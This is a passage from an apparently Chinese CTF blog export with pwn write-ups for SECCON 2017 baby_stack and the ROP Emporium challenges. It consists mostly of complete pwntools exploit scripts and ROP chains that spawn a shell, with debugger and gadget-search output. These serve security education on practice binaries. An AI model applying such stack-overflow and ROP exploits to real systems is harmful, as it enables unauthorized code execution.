+ input); &#125; return inet_pton(10, cp, &amp;v4);&#125; ip示例 1234# ./020d04ea8f10ac07c5b83f3d0910108b 0:0:0:0:0:0:0:0-&gt; Valid IP// TODO - Finish later... 而且ip那里特意给了个.截断，最终exp 1234567891011121314# -*- coding: utf-8 -*-from pwn import *p = process(\"./020d04ea8f10ac07c5b83f3d0910108b\")readips = 0x08048819padding = \"a\" * 36trueipv6 = \"0:0:0:0:0:0:0:0\" payload = trueipv6 + \"\\x2e\" + paddingpayload += p32(readips)payload += \"a\" * (270 - len(payload))p.sendline(payload)p.interactive()","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://www.giantbranch.cn/tags/pwn/"},{"name":"ctf","slug":"ctf","permalink":"https://www.giantbranch.cn/tags/ctf/"}]},{"title":"SECCON 2017 baby_stack","slug":"SECCON 2017 baby_stack","date":"2017-12-19T00:00:00.000Z","updated":"2023-10-13T13:14:33.058Z","comments":true,"path":"2017/12/19/SECCON 2017 baby_stack/","link":"","permalink":"https://www.giantbranch.cn/2017/12/19/SECCON 2017 baby_stack/","excerpt":"","text":"保护措施 12345Arch: amd64-64-littleRELRO: No RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x400000) 就是一个输入输出的程序 12345# ./baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8 Please tell me your name &gt;&gt; aGive me your message &gt;&gt; bThank you, a!msg : b 静态链接的，那么就不用libc了 12# file ./baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8 ./baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, not stripped 不过呢，是go语言编写的，输入比较长的字符给message后可以看到报错中有.go文件 123456789101112131415161718192021222324./baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8 Please tell me your name &gt;&gt; aGive me your message &gt;&gt; aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaapanic: runtime error: growslice: cap out of rangegoroutine 1 [running]:panic(0x4e4800, 0xc82000a360) /usr/lib/go-1.6/src/runtime/panic.go:481 +0x3e6fmt.(*fmt).padString(0xc82006cef8, 0x6161616161616161, 0x6161616161616161) /usr/lib/go-1.6/src/fmt/format.go:130 +0x406fmt.(*fmt).fmt_s(0xc82006cef8, 0x6161616161616161, 0x6161616161616161) /usr/lib/go-1.6/src/fmt/format.go:322 +0x61fmt.(*pp).fmtString(0xc82006cea0, 0x6161616161616161, 0x6161616161616161, 0xc800000073) /usr/lib/go-1.6/src/fmt/print.go:521 +0xdcfmt.(*pp).printArg(0xc82006cea0, 0x4c1c00, 0xc82000a340, 0x73, 0x0, 0x0) /usr/lib/go-1.6/src/fmt/print.go:797 +0xd95fmt.(*pp).doPrintf(0xc82006cea0, 0x5220a0, 0x18, 0xc82003bea8, 0x2, 0x2) /usr/lib/go-1.6/src/fmt/print.go:1238 +0x1dcdfmt.Fprintf(0x7fa1306231e8, 0xc820028010, 0x5220a0, 0x18, 0xc82003bea8, 0x2, 0x2, 0x40beee, 0x0, 0x0) /usr/lib/go-1.6/src/fmt/print.go:188 +0x74fmt.Printf(0x5220a0, 0x18, 0xc82003bea8, 0x2, 0x2, 0x20, 0x0, 0x0) /usr/lib/go-1.6/src/fmt/print.go:197 +0x94main.main() /home/yutaro/CTF/SECCON/2017/baby_stack/baby_stack.go:23 +0x45e 这里有个坑就是你输入的字符串太长就像上面的，感觉没啥可利用的地方，假如你输入115个你可以看到你可以控制复制的源地址和复制的大小，计算一下偏移就是104 12345678910111213141516171819202122232425262728293031323334# ./baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8 Please tell me your name &gt;&gt; aGive me your message &gt;&gt; aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaunexpected fault address 0x0fatal error: fault[signal 0xb code=0x80 addr=0x0 pc=0x456551]goroutine 1 [running]:runtime.throw(0x507550, 0x5) /usr/lib/go-1.6/src/runtime/panic.go:547 +0x90 fp=0xc82003b5b8 sp=0xc82003b5a0runtime.sigpanic() /usr/lib/go-1.6/src/runtime/sigpanic_unix.go:27 +0x2ab fp=0xc82003b608 sp=0xc82003b5b8runtime.memmove(0xc82008c00b, 0x6161616161616161, 0x616161) /usr/lib/go-1.6/src/runtime/memmove_amd64.s:83 +0x91 fp=0xc82003b610 sp=0xc82003b608fmt.(*fmt).padString(0xc82006cd58, 0x6161616161616161, 0x616161) /usr/lib/go-1.6/src/fmt/format.go:130 +0x456 fp=0xc82003b730 sp=0xc82003b610fmt.(*fmt).fmt_s(0xc82006cd58, 0x6161616161616161, 0x616161) /usr/lib/go-1.6/src/fmt/format.go:322 +0x61 fp=0xc82003b760 sp=0xc82003b730fmt.(*pp).fmtString(0xc82006cd00, 0x6161616161616161, 0x616161, 0xc800000073) /usr/lib/go-1.6/src/fmt/print.go:521 +0xdc fp=0xc82003b790 sp=0xc82003b760fmt.(*pp).printArg(0xc82006cd00, 0x4c1c00, 0xc82000a340, 0x73, 0x0, 0x0) /usr/lib/go-1.6/src/fmt/print.go:797 +0xd95 fp=0xc82003b918 sp=0xc82003b790fmt.(*pp).doPrintf(0xc82006cd00, 0x5220a0, 0x18, 0xc82003bea8, 0x2, 0x2) /usr/lib/go-1.6/src/fmt/print.go:1238 +0x1dcd fp=0xc82003bca0 sp=0xc82003b918fmt.Fprintf(0x7f7b5b4011e8, 0xc820028010, 0x5220a0, 0x18, 0xc82003bea8, 0x2, 0x2, 0x40beee, 0x0, 0x0) /usr/lib/go-1.6/src/fmt/print.go:188 +0x74 fp=0xc82003bce8 sp=0xc82003bca0fmt.Printf(0x5220a0, 0x18, 0xc82003bea8, 0x2, 0x2, 0x20, 0x0, 0x0) /usr/lib/go-1.6/src/fmt/print.go:197 +0x94 fp=0xc82003bd50 sp=0xc82003bce8main.main() /home/yutaro/CTF/SECCON/2017/baby_stack/baby_stack.go:23 +0x45e fp=0xc82003bf50 sp=0xc82003bd50runtime.main() /usr/lib/go-1.6/src/runtime/proc.go:188 +0x2b0 fp=0xc82003bfa0 sp=0xc82003bf50runtime.goexit() /usr/lib/go-1.6/src/runtime/asm_amd64.s:1998 +0x1 fp=0xc82003bfa8 sp=0xc82003bfa0 假如传入可读的地址和一个大小，我们就可以print出东西 123456789101112131415161718# -*- coding: utf-8 -*-from pwn import *#context.log_level = 'debug' p = process(\"baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8\")padding = \"a\" * 104payload = padding + p64(0xc82003b608) + p64(8)p.recvuntil(\"Please tell me your name &gt;&gt; \")p.sendline(\"a\")p.recvuntil(\"Give me your message &gt;&gt; \")p.sendline(payload)p.interactive() 结果 123456789python exp.py [!] Could not find executable 'baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8' in $PATH, using './baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8' instead[+] Starting local process './baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8': pid 7346[*] Switching to interactive mode[*] Process './baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8' stopped with exit code 0 (pid 7346)Thank you, V&#123;E\\x00\\x00\\x00\\x00\\x00!msg : aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa[*] Got EOF while reading in interactive$ 可以看到，我们控制了第一个printf的输出，那么我们是不是可以通过加长控制第二个输出不产生异常，进而覆盖返回地址呢（注意重点是不产生异常） 通过70 80 90这样试，发现padding是80 123payload = padding + p64(0xc82003b608) + p64(8) + \"a\" * 70payload = padding + p64(0xc82003b608) + p64(8) + \"a\" * 80payload = padding + p64(0xc82003b608) + p64(8) + \"a\" * 90 发现padding是80 最后gdb字符串定位 1234padding = \"a\" * 104padding2 = \"a\" * 80payload = padding + p64(0xc82003b608) + p64(8) + padding2 + p64(0xc82003b608) + p64(8) + \"AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%b\" gdb查看 123456789101112131415161718[-------------------------------------code-------------------------------------] 0x401454 &lt;main.main+1108&gt;: mov QWORD PTR [rsp+0x20],rbx 0x401459 &lt;main.main+1113&gt;: call 0x45ac40 &lt;fmt.Printf&gt; 0x40145e &lt;main.main+1118&gt;: add rsp,0x1f8=&gt; 0x401465 &lt;main.main+1125&gt;: ret 0x401466 &lt;main.main+1126&gt;: lea r8,[rbx+0x8] 0x40146a &lt;main.main+1130&gt;: mov QWORD PTR [rsp],r8 0x40146e &lt;main.main+1134&gt;: mov QWORD PTR [rsp+0x8],rax 0x401473 &lt;main.main+1139&gt;: call 0x40f330 &lt;runtime.writebarrierptr&gt;[------------------------------------stack-------------------------------------]0000| 0xc82003bf48 (\"ZAAxAAyAAzA%%A%\"...)0008| 0xc82003bf50 (\"AzA%%A%sA%BA%$A\"...)0016| 0xc82003bf58 (\"A%BA%$A%nA%CA%-\"...)0024| 0xc82003bf60 (\"nA%CA%-A%(A%DA%\"...)0032| 0xc82003bf68 (\"%(A%DA%;A%)A%EA\"...)0040| 0xc82003bf70 (\"A%)A%EA%aA%0A%F\"...)0048| 0xc82003bf78 (\"aA%0A%FA%b\")0056| 0xc82003bf80 --&gt; 0x6225 ('%b') 算偏移 1234pwndbg&gt; x /gx 0xc82003bf480xc82003bf48: 0x417941417841415apwndbg&gt; pattern_offset 0x417941417841415a4717873834093527386 found at offset: 192 这静态编译的，没有导入表，使用系统调用吧，查了下程序中刚好有系统调用，64位是syscall，32位是int 0x80 12ROPgadget --binary ./baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8 | grep \"syscall\"0x0000000000456889 : syscall ; ret 而64位下，execve的系统调用号为59，即0x3b 1#define __NR_execve 59 查询可以到这，我之前记录了 http://blog.csdn.net/u012763794/article/details/78777938 接下来我们就构造rop，调用execve(“bin//sh”)，传参的话是前三个参数在rdi,rsi和rdx rdi的设置 首先设置rdi为bss首地址地址的组件 12ROPgadget --binary ./baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8 | grep \"pop rdi\"0x0000000000470931 : pop rdi ; or byte ptr [rax + 0x39], cl ; ret 往bss数据写入的组件 12ROPgadget --binary ./baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8 | grep \"mov qword ptr \\[rdi\\]\"0x0000000000456499 : mov qword ptr [rdi], rax ; ret 给rax赋值 12ROPgadget --binary ./baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8 | grep \"pop rax ; ret\"0x00000000004016ea : pop rax ; ret 上面要设置rax为可读可写，选个0x58e100吧 12345678910111213pwndbg&gt; vmmap LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA 0x400000 0x4b1000 r-xp b1000 0 /root/learn/SECCON2017/baby_stack/baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8 0x4b1000 0x58e000 r--p dd000 b1000 /root/learn/SECCON2017/baby_stack/baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8 0x58e000 0x5a0000 rw-p 12000 18e000 /root/learn/SECCON2017/baby_stack/baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8 0x5a0000 0x5c0000 rw-p 20000 0 [heap] 0xc000000000 0xc000001000 rw-p 1000 0 0xc81fff8000 0xc820100000 rw-p 108000 0 0x7ffff7f2b000 0x7ffff7ffb000 rw-p d0000 0 0x7ffff7ffb000 0x7ffff7ffd000 r--p 2000 0 [vvar] 0x7ffff7ffd000 0x7ffff7fff000 r-xp 2000 0 [vdso] 0x7ffffffde000 0x7ffffffff000 rw-p 21000 0 [stack]0xffffffffff600000 0xffffffffff601000 r-xp 1000 0 [vsyscall] rsi和rdx要置0 12345ROPgadget --binary ./baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8 | grep \"pop rsi\"0x000000000046defd : pop rsi ; retROPgadget --binary ./baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8 | grep \"pop rdx\"0x00000000004a247c : pop rdx ; or byte ptr [rax - 0x77], cl ; ret 最终payload 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263# -*- coding: utf-8 -*-from pwn import *# context.log_level = 'debug' p = process(\"baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8\")padding = \"a\" * 104padding2 = \"a\" * 80padding3 = \"a\" * 192# ROPgadget --binary ./baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8 # 0x0000000000470931 : pop rdi ; or byte ptr [rax + 0x39], cl ; ret# 0x0000000000456499 : mov qword ptr [rdi], rax ; ret# 0x00000000004016ea : pop rax ; ret# 0x000000000046defd : pop rsi ; ret# 0x00000000004a247c : pop rdx ; or byte ptr [rax - 0x77], cl ; ret# 0x0000000000456889 : syscall ; retpop_rdi_ret = 0x0000000000470931mov_rdi_rax = 0x0000000000456499pop_rax_ret = 0x00000000004016eapop_rsi_ret = 0x000000000046defdpop_rdx_ret = 0x00000000004a247csyscall_ret = 0x0000000000456889wx_address = 0x58e100bss_addr = 0x000000000059f920bin_sh = \"/bin/sh\\x00\"# write bin_sh to bss_addrrop_gadgets = \"\"rop_gadgets += p64(pop_rax_ret)rop_gadgets += p64(wx_address)rop_gadgets += p64(pop_rdi_ret)rop_gadgets += p64(bss_addr)rop_gadgets += p64(pop_rax_ret)rop_gadgets += bin_shrop_gadgets += p64(mov_rdi_rax)# left rsi = rdx = 0rop_gadgets += p64(pop_rsi_ret)rop_gadgets += p64(0)rop_gadgets += p64(pop_rax_ret)rop_gadgets += p64(wx_address)rop_gadgets += p64(pop_rdx_ret)rop_gadgets += p64(0)# set syscall num: eax = 0x3brop_gadgets += p64(pop_rax_ret)rop_gadgets += p64(0x3b)# syscallrop_gadgets += p64(syscall_ret)payload = padding + p64(0xc82003b608) + p64(8) + padding2 + p64(0xc82003b608) + p64(8) + padding3 + rop_gadgetsp.recvuntil(\"Please tell me your name &gt;&gt; \")p.sendline(\"a\")p.recvuntil(\"Give me your message &gt;&gt; \")p.sendline(payload)p.interactive()","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://www.giantbranch.cn/tags/pwn/"},{"name":"stack","slug":"stack","permalink":"https://www.giantbranch.cn/tags/stack/"},{"name":"go","slug":"go","permalink":"https://www.giantbranch.cn/tags/go/"}]},{"title":"rop emporium challenges wp","slug":"rop emporium challenges wp","date":"2017-12-18T00:00:00.000Z","updated":"2023-10-13T13:14:33.130Z","comments":true,"path":"2017/12/18/rop emporium challenges wp/","link":"","permalink":"https://www.giantbranch.cn/2017/12/18/rop emporium challenges wp/","excerpt":"","text":"前言下载地址：https://ropemporium.com/ 虽然说简单，但是后面badchar后面的rop还是学到了不少东西的~ 程序默认开启nx 12345CANARY : disabledFORTIFY : disabledNX : ENABLEDPIE : disabledRELRO : Partial 如果是so就多开了个PIE ret2win直接覆盖返回地址为win函数 12345678# -*- coding: utf-8 -*-from pwn import *p = process('./ret2win')p.recvuntil(\"&gt; \")win = 0x400811payload = \"a\" * 40 + p64(win)p.sendline(payload)p.interactive() ret2win3232位版 12345678# -*- coding: utf-8 -*-from pwn import *p = process('./ret2win32')p.recvuntil(\"&gt; \")win = 0x8048659payload = \"a\" * 44 + p32(win)p.sendline(payload)p.interactive() split这次有个函数执行/bin/ls 我们看看字符串，刚好有个/bin/cat flag.txt 12345678# strings ./split ......ExitingContriving a reason to ask user for data.../bin/ls;*3$\"/bin/cat flag.txt...... exp 12345678910# -*- coding: utf-8 -*-from pwn import *p = process('./split')p.recvuntil(\"&gt; \")pop_rdi_ret = 0x0000000000400883call_system = 0x400810cat_flag = 0x601060payload = \"a\" * 40 + p64(pop_rdi_ret) + p64(cat_flag) + p64(call_system)p.sendline(payload)p.interactive() split321234567891011# -*- coding: utf-8 -*-from pwn import *p = process('./split32')p.recvuntil(\"&gt; \")call_system = 0x08048430cat_flag = 0x0804A030pwnme = 0x080485F6payload = \"a\" * 44 + p32(call_system) + p32(pwnme) + p32(0x0804A030)p.sendline(payload)p.interactive() callme就是依次调用callmeone，two，three，参数是1，2，3就行 1234567891011121314151617181920# -*- coding: utf-8 -*-from pwn import *p = process(\"./callme\")# pop rdi ; retpop_rdi_ret = 0x0000000000401b23# pop rdx ; retpop_rdx_ret = 0x0000000000401ab2 pop_rsi_pop_rdx_ret = 0x0000000000401ab1 callmeone = 0x401850callmetwo = 0x401870 callmethree = 0x401810p.recvuntil(\"&gt; \")payload = 'a' * 40 + p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_pop_rdx_ret) + p64(2) + p64(3) + p64(callmeone) + p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_pop_rdx_ret) + p64(2) + p64(3) + p64(callmetwo) + p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_pop_rdx_ret) + p64(2) + p64(3) + p64(callmethree)p.sendline(payload)p.interactive() callme3232位，栈上传参而已 1234567891011121314151617# -*- coding: utf-8 -*-from pwn import *p = process(\"./callme32\")pop3_ret = 0x080488a9callmeone = 0x80485c0callmetwo = 0x8048620 callmethree = 0x80485b0pwnme =0x80487b6p.recvuntil(\"&gt; \")payload = 'a' * 44 + p32(callmeone) + p32(pop3_ret) + p32(1) + p32(2) + p32(3) + p32(callmetwo) + p32(pop3_ret) + p32(1) + p32(2) + p32(3) + p32(callmethree) + p32(pwnme) + p32(1) + p32(2) + p32(3)p.sendline(payload)p.interactive() write4这个的话没有/bin/cat flag.txt字符串了，那么这就需要我们写到内存了 加入我们想用fgets写到内存需要3个参数，但是gadgets里面没有pop rdx的，那么就不能给第三个参数传参，那么我们可以找其他方法，通过汇编的mov看看有什么组件 我选择了下面两个，目标地址写到bss 120x0000000000400820 : mov qword ptr [r14], r15 ; ret0x0000000000400890 : pop r14 ; pop r15 ; ret 我们先写个cat flag.txt试试 12345678910111213141516171819202122232425262728# -*- coding: utf-8 -*-from pwn import *p = process('./write4')p.recvuntil(\"&gt; \")# ROPgadget --binary ./write4 --only \"mov|ret\"# 0x0000000000400820 : mov qword ptr [r14], r15 ; retmov_r14_r15 = 0x0000000000400820# ROPgadget --binary ./write4 --only \"pop|ret\"# 0x0000000000400890 : pop r14 ; pop r15 ; retpop_r14_r15_ret = 0x0000000000400890pop_rdi_ret = 0x0000000000400893bss_addr = 0x0000000000601060call_system = 0x4005E0cat_flag = [\"cat flag\",\".txt\".ljust(8, \"\\x00\")]payload = \"a\" * 40 for x in xrange(0, 2): payload += p64(pop_r14_r15_ret) payload += p64(bss_addr + x * 8) payload += cat_flag[x] payload += p64(mov_r14_r15)payload += p64(pop_rdi_ret)payload += p64(bss_addr)payload += p64(call_system)p.sendline(payload)p.interactive() 我们直接写个sh试试，只贴payload当然你改成/bin/sh\\x00也可以 1234567891011get_sh = \"sh\".ljust(8, \"\\x00\")payload = \"a\" * 40 payload += p64(pop_r14_r15_ret)payload += p64(bss_addr)payload += get_shpayload += p64(mov_r14_r15)payload += p64(pop_rdi_ret)payload += p64(bss_addr)payload += p64(call_system) write432这个也是类似的 1234567891011121314151617181920212223242526# -*- coding: utf-8 -*-from pwn import *p = process('./write432')p.recvuntil(\"&gt; \")# ROPgadget --binary ./write432 --only \"mov|ret\"# 0x08048670 : mov dword ptr [edi], ebp ; retmov_edi_ebp = 0x08048670# ROPgadget --binary ./write432 --only \"pop|ret\"# 0x080486da : pop edi ; pop ebp ; retpop_edi_ebp_ret = 0x080486dacall_system = 0x08048430bss_addr = 0x0804a040sh = \"sh\\x00\\x00\"payload = \"a\" * 44 payload += p32(pop_edi_ebp_ret)payload += p32(bss_addr)payload += shpayload += p32(mov_edi_ebp)payload += p32(call_system)payload += \"aaaa\"payload += p32(bss_addr)p.sendline(payload)p.interactive() badchars一开始一看这么简单，badchars是这几个，但是有个b和s，我们就不能/bin/sh了 123456789101112131415161718192021222324void pwnme()&#123; char *v0; // rax@2 char *v1; // ST08_8@2 size_t v2; // rax@2 size_t n; // ST00_8@2 void *s; // [sp+8h] [bp-28h]@1 __int64 v5; // [sp+10h] [bp-20h]@2 s = malloc(0x200uLL); if ( !s ) exit(1); memset(s, 0, 0x200uLL); memset(&amp;v5, 0, 0x20uLL); puts(\"badchars are: b i c / &lt;space&gt; f n s\"); printf(\"&gt; \", 0LL, 0LL); v0 = fgets((char *)s, 512, stdin); v1 = v0; LODWORD(v2) = nstrlen(v0, 512LL); n = v2; checkBadchars(v1, v2); memcpy(&amp;v5, v1, n); free(v1);&#125; 那我们就要对payload加密，之后运行的时候再解密了 按照官方的提示，是要xor加密，之后再用gadgets解密 首先可以找下可以用于异或的数字，找10以内的（其实有些还是不行，比如4是传输结束，这应该不行） 123456789101112131415# -*- coding: utf-8 -*-badchars = [98, 105, 99, 47, 32, 102, 110, 115]bin_sh = \"/bin/sh\\x00\"xorNum = 1while 1: for x in bin_sh: tmp = ord(x) ^ xorNum if tmp in badchars: xorNum = xorNum + 1 break if x == \"\\x00\": xorNum = xorNum + 1 print xorNum if xorNum == 10: break 运行结果，那我们选个3吧，有时候传不过去的话可能这个ascii代表传输结束什么的， 1234534610[Finished in 0.1s] 我们通过ROPgadget，找到一些组件，先将我们的/bin/sh写到bss，再去解密，再执行 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748# -*- coding: utf-8 -*-from pwn import *p = process(\"./badchars\")elf = ELF(\"./badchars\")plt_puts = elf.plt[\"puts\"]# 0x0000000000400b39 : pop rdi ; retpop_rdi_ret = 0x0000000000400b39call_system = 0x4009E8bss_addr = 0x601080# ROPgadget --binary ./badchars --only \"|pop|mov|xor|ret\"# 0x0000000000400b3b : pop r12 ; pop r13 ; ret# 0x0000000000400b34 : mov qword ptr [r13], r12 ; ret# 0x0000000000400b40 : pop r14 ; pop r15 ; ret# 0x0000000000400b30 : xor byte ptr [r15], r14b ; retpop_r12_r13_ret = 0x0000000000400b3bmov_r12_r13_ret = 0x0000000000400b34pop_r14_r15_ret = 0x0000000000400b40xor_r15_r14_ret = 0x0000000000400b30bin_sh = \"/bin/sh\\x00\"xor_bin_sh = \"\"for x in bin_sh: xor_bin_sh += chr(ord(x) ^ 3)p.recvuntil(\"&gt; \")payload = 'a' * 40 # mov xor_bin_sh to bss_addrpayload += p64(pop_r12_r13_ret)payload += xor_bin_shpayload += p64(bss_addr)payload += p64(mov_r12_r13_ret)# xor bss_addr's with r14for x in xrange(0, len(xor_bin_sh)): payload += p64(pop_r14_r15_ret) payload += p64(3) payload += p64(bss_addr + x) payload += p64(xor_r15_r14_ret)# exec system(\"/bin/sh\\x00\")payload += p64(pop_rdi_ret)payload += p64(bss_addr)payload += p64(call_system)p.sendline(payload)p.interactive() badchars32这个也用xor吧，这次我们异或0xff 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051# -*- coding: utf-8 -*-from pwn import *p = process('./badchars32')p.recvuntil(\"&gt; \")# ROPgadget --binary ./badchars32 --only \"mov|ret\"# 0x08048893 : mov dword ptr [edi], esi ; retmov_edi_esi = 0x08048893# ROPgadget --binary ./badchars32 --only \"xor|ret\"# 0x08048890 : xor byte ptr [ebx], cl ; retxor_ebx_cl = 0x08048890# ROPgadget --binary ./badchars32 --only \"pop|ret\"# 0x08048896 : pop ebx ; pop ecx ; ret# 0x08048899 : pop esi ; pop edi ; retpop_ebx_ecx_ret = 0x08048896pop_esi_edi_ret = 0x08048899call_system = 0x080484E0bss_addr = 0x0804a040sh = \"/bin/sh\\x00\"xorsh = \"\"xorNum = 0xfffor x in sh: xorsh += chr(ord(x) ^ xorNum)# raw_input()payload = \"a\" * 44 # write xorsh to bsspayload += p32(pop_esi_edi_ret)payload += xorsh[0:4]payload += p32(bss_addr)payload += p32(mov_edi_esi)payload += p32(pop_esi_edi_ret)payload += xorsh[4:8]payload += p32(bss_addr+4)payload += p32(mov_edi_esi)# xor for x in xrange(0,len(sh)): payload += p32(pop_ebx_ecx_ret) payload += p32(bss_addr + x) payload += p32(xorNum) payload += p32(xor_ebx_cl)payload += p32(call_system)payload += \"aaaa\"payload += p32(bss_addr)p.sendline(payload)p.interactive() fluff来到这的时候已经没有了mov指令了，但下面的吸引了我 mov dword ptr [rdx], ebx ; pop r13 ; pop r12 ; xor byte ptr [r10], r12b ; ret 再找一下给rdx赋值的，但我们没法操作rdx啊再找找，找不到啊 看下别人的wp，原来还有个–depth的参数ROPgadget –binary ./fluff –depth 20 我们就选用这条mov 10x000000000040084d : pop rdi ; mov qword ptr [r10], r11 ; pop r13 ; pop r12 ; xor byte ptr [r10], r12b ; ret 但找不到pop r10，r11啊，返回空 12# ROPgadget --binary ./fluff --depth 20 | grep \"pop r10\"# ROPgadget --binary ./fluff --depth 20 | grep \"pop r11\" 直接找看看r11相关的 12345ROPgadget --binary ./fluff --depth 20 | grep \"r11\"......0x0000000000400840 : xchg r11, r10 ; pop r15 ; mov r11d, 0x602050 ; ret0x0000000000400822 : xor r11, r11 ; pop r14 ; mov edi, 0x601050 ; ret0x000000000040082f : xor r11, r12 ; pop r12 ; mov r13d, 0x604060 ; ret 最后两个不就可以通过r12赋值给r11吗，在查下r12，有pop可以 10x0000000000400832 : pop r12 ; mov r13d, 0x604060 ; ret 而且上面有个交换r11，r10的，不也可以给r10赋值了吗 而且看了下程序，原理作者都写到一块去了 1234567891011121314151617181920212223242526.text:0000000000400820 public questionableGadgets.text:0000000000400820 questionableGadgets:.text:0000000000400820 pop r15.text:0000000000400822 xor r11, r11.text:0000000000400825 pop r14.text:0000000000400827 mov edi, offset __data_start.text:000000000040082C retn.text:000000000040082D ; ---------------------------------------------------------------------------.text:000000000040082D pop r14.text:000000000040082F xor r11, r12.text:0000000000400832 pop r12.text:0000000000400834 mov r13d, 604060h.text:000000000040083A retn.text:000000000040083B ; ---------------------------------------------------------------------------.text:000000000040083B mov edi, offset __data_start.text:0000000000400840 xchg r10, r11.text:0000000000400843 pop r15.text:0000000000400845 mov r11d, 602050h.text:000000000040084B retn.text:000000000040084C ; ---------------------------------------------------------------------------.text:000000000040084C pop r15.text:000000000040084E mov [r10], r11.text:0000000000400851 pop r13.text:0000000000400853 pop r12.text:0000000000400855 xor [r10], r12b.text:0000000000400858 retn 最终payload 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051# -*- coding: utf-8 -*-from pwn import *p = process('./fluff')p.recvuntil(\"&gt; \")# ROPgadget --binary ./fluff --depth 20# 0x000000000040084d : pop rdi ; mov qword ptr [r10], r11 ; pop r13 ; pop r12 ; xor byte ptr [r10], r12b ; ret# 0x0000000000400840 : xchg r11, r10 ; pop r15 ; mov r11d, 0x602050 ; ret# 0x0000000000400822 : xor r11, r11 ; pop r14 ; mov edi, 0x601050 ; ret# 0x000000000040082f : xor r11, r12 ; pop r12 ; mov r13d, 0x604060 ; ret# 0x0000000000400832 : pop r12 ; mov r13d, 0x604060 ; retmov_r10_r11 = 0x000000000040084dxchg_r11_r10 = 0x0000000000400840xor_r11_r11 = 0x0000000000400822xor_r11_r12 = 0x000000000040082fpop_r12 = 0x0000000000400832pop_rdi = 0x00000000004008c3call_system = 0x4005E0 bss_addr = 0x601060bin_sh = \"/bin/sh\\x00\"notuse = \"a\" * 8payload = \"a\" * 40 # mov bss_addr to r10payload += p64(pop_r12)payload += p64(bss_addr)payload += p64(xor_r11_r11)payload += notusepayload += p64(xor_r11_r12)payload += notusepayload += p64(xchg_r11_r10)payload += notuse# mov bin_sh to r11payload += p64(pop_r12)payload += bin_shpayload += p64(xor_r11_r11)payload += notusepayload += p64(xor_r11_r12)payload += notuse# write bin_sh to bss_addr (mov [r10], r11)payload += p64(mov_r10_r11)payload += p64(bss_addr)payload += notusepayload += p64(0)payload += p64(call_system)p.sendline(payload)p.interactive() fluff32有了上一题的经验，直接找到作者内嵌汇编写的组件 1234567891011121314151617181920212223242526.text:08048670 public questionableGadgets.text:08048670 questionableGadgets:.text:08048670 pop edi.text:08048671 xor edx, edx.text:08048673 pop esi.text:08048674 mov ebp, 0CAFEBABEh.text:08048679 retn.text:0804867A ; ---------------------------------------------------------------------------.text:0804867A pop esi.text:0804867B xor edx, ebx.text:0804867D pop ebp.text:0804867E mov edi, 0DEADBABEh.text:08048683 retn.text:08048684 ; ---------------------------------------------------------------------------.text:08048684 mov edi, 0DEADBEEFh.text:08048689 xchg ecx, edx.text:0804868B pop ebp.text:0804868C mov edx, 0DEFACED0h.text:08048691 retn.text:08048692 ; ---------------------------------------------------------------------------.text:08048692 pop edi.text:08048693 mov [ecx], edx.text:08048695 pop ebp.text:08048696 pop ebx.text:08048697 xor [ecx], 